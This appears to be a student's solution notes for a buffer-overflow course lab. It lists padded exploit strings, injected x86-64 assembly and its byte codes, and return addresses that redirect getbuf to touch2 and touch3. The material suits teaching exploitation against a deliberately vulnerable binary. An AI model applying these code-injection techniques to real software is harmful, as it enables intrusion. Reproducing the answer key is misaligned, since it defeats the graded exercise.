/* phase1: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 */

/* phase2: */
/* First, use gdb, break @func{getbuf}, %rsp=0x5561dcA0, R[rsp]=0x401976; the exploit address: %rsp-0x28*/
/* Second, write code: */
/* movq $0x59b997fa, %rdi   # cookie */
/* pushq 0x4017ec */
/* retq             # use return to call touch2  */
/* gcc -c phase2.s   objdump -d phase2.o > phase2.d */
/* get byte code: 48 c7 c7 fa 97 b9 59 |68 ec 17 40 00 c3 */
/* phase2: 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 dc 61 55 00 00 00 00 */

/* phase3: */
/* First, the stack is not changed.*/
/* Second, There is a random function, and stack will be changed. */
/* Third, code: */
/* movabsq $0x6166373939623935, %rax */
/* movq %rax, 8(%rsp) */
/* movb $0x00, 16(%rsp) */
/* leaq 8(%rsp), %rdi */
/* pushq $0x4018fa */
/* retq */
/* get byte code: 48 b8 35 39 62 39 39 37 66 61 |48 89 44 24 08 |c6 44 24 10 00 |48 8d 7c 24 08 |68 fa 18 40 00 |c3  -- 31bytes */
/* phase3: 48 b8 35 39 62 39 39 37 66 61 48 89 44 24 08 c6 44 24 10 00 48 8d 7c 24 08 68 fa 18 40 00 c3 30 30 30 30 30 30 30 30 30 78 DC 61 55 00 00 00 00 */

/* phase3 easy version: */
/* First, the stack is not changed, stack will be changed. */
/* we write cookie string to %rsp so that the caller stack will be destroyed... */
/* movq %rsp, %rdi */
/* pushq $0x4018FA */
/* ret */
/* answer: 48 89 e7 68 FA 18 40 00 c3 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 */